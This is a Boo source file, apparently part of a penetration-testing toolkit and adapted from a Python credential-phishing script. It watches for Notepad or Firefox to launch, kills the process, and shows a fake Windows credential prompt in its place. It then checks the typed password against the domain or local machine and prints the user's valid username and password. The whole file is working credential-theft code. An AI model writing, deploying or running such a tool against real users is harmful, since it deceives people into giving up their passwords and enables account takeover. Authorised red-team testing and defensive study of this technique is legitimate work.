/*
 *  Inspired by ProcessCredPhish.py, an IronPython version by Leron Gray (@daddycocoaman)
 *  https://github.com/daddycocoaman/IronPentest/blob/master/Credentials/ProcessCredPhish.py
 *
 *  This version is written using Boolang importing CredUIPromptForCredentials from credui.dll
 */
import System
import System.Runtime.InteropServices
import System.Management from System.Management
import System.Text
import System.Diagnostics
import System.Globalization
from System.DirectoryServices.AccountManagement import PrincipalContext, ContextType
from System.Threading import Thread

enum CredUIReturnCodes:
    NO_ERROR = 0
    ERROR_CANCELLED = 1223
    ERROR_NO_SUCH_LOGON_SESSION = 1312
    ERROR_NOT_FOUND = 1168
    ERROR_INVALID_ACCOUNT_NAME = 1315
    ERROR_INSUFFICIENT_BUFFER = 122
    ERROR_INVALID_PARAMETER = 87
    ERROR_INVALID_FLAGS = 1004

enum CREDUI_FLAGS:
    INCORRECT_PASSWORD = 0x1
    DO_NOT_PERSIST = 0x2
    REQUEST_ADMINISTRATOR = 0x4
    EXCLUDE_CERTIFICATES = 0x8
    REQUIRE_CERTIFICATE = 0x10
    SHOW_SAVE_CHECK_BOX = 0x40
    ALWAYS_SHOW_UI = 0x80
    REQUIRE_SMARTCARD = 0x100
    PASSWORD_ONLY_OK = 0x200
    VALIDATE_USERNAME = 0x400
    COMPLETE_USERNAME = 0x800
    PERSIST = 0x1000
    SERVER_CREDENTIAL = 0x4000
    EXPECT_CONFIRMATION = 0x20000
    GENERIC_CREDENTIALS = 0x40000
    USERNAME_TARGET_CREDENTIALS = 0x80000
    KEEP_USERNAME = 0x100000

[DllImport("credui.dll")]
def CredUIPromptForCredentials(creditUR as CREDUI_INFO,
        targetName as string,
        reserved1 as IntPtr,
        iError as int,
        userName as StringBuilder,
        maxUserName as int,
        password as StringBuilder,
        maxPassword as int,
        pfSave as bool,
        flags as CREDUI_FLAGS) as CredUIReturnCodes:
        pass

struct CREDUI_INFO:
    public cbSize as int
    public hbmBanner as IntPtr
    public hwndParent as IntPtr
    public pszCaptionText as string
    public pszMessageText as string

def PromptForPassword(user as string, process as string) as string:
    userPassword as StringBuilder = StringBuilder()
    userID as StringBuilder = StringBuilder(user)
    credUI as CREDUI_INFO = CREDUI_INFO()
    credUI.cbSize = Marshal.SizeOf(credUI)
    save as bool = false;
    flags as CREDUI_FLAGS = CREDUI_FLAGS.ALWAYS_SHOW_UI | CREDUI_FLAGS.GENERIC_CREDENTIALS;
    
    CredUIPromptForCredentials(credUI, process, IntPtr.Zero, 0, userID, 100, userPassword, 100, save, flags);
    
    return userPassword.ToString()

_validatingPassword = false
validPassword as string
processes_to_watch as List = ['notepad.exe', 'firefox.exe'] 

currentUser as string = System.Security.Principal.WindowsIdentity.GetCurrent().Name

startWatch as ManagementEventWatcher = ManagementEventWatcher(WqlEventQuery('__InstanceCreationEvent',
                                                                            TimeSpan(0,0,1),
                                                                            'TargetInstance isa "Win32_Process"'))
startWatch.Start()
print "[*] WATCHER STARTED"

while true:
    if _validatingPassword:
        continue
    print "[*] WAITING FOR THE NEXT EVENT..."
    process as ManagementBaseObject = startWatch.WaitForNextEvent()
    print "[*] EVENT CAPTURED!"
    instance = process['TargetInstance'] as ManagementBaseObject
    name as string = instance['Name']
    id = instance['ProcessId']
    
    if name in processes_to_watch:
        _validatingPassword = true
        print "[*] PROCESS SPAWNED: $(name)[$(id)]"    
        Process.GetProcessById(id).Kill()
        clearName = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(name.Replace('.exe',''))
        try:
            passwordAttempt as string = PromptForPassword(currentUser, clearName)
            if passwordAttempt:
                print "[*] VALIDATING PASSWORD: $(passwordAttempt)" 
                context as PrincipalContext
                try:
                    context = PrincipalContext(ContextType.Domain)
                except e as System.DirectoryServices.AccountManagement.PrincipalServerDownException:
                    context = PrincipalContext(ContextType.Machine)
                validCredentials as bool = context.ValidateCredentials(currentUser, passwordAttempt)
                if validCredentials:
                    validPassword = passwordAttempt
                    startWatch.Stop()
                    break
                else:
                    print "[-] INVALID PASSWORD: $(passwordAttempt)"
            else:
                print "[-] EMPTY PASSWORD"
        except:
            pass
        ensure:
            _validatingPassword = false

    if not instance['Name'] in processes_to_watch:
        print "[-] IGNORING PROCESS: $(name)"

    break unless not validPassword      

print "\n[+] VALID CREDENTIALS FOUND: $(currentUser):$(validPassword)\n"
print "[*] BYE!"

output = "\n[+] VALID CREDENTIALS FOUND: $(currentUser):$(validPassword)\n"
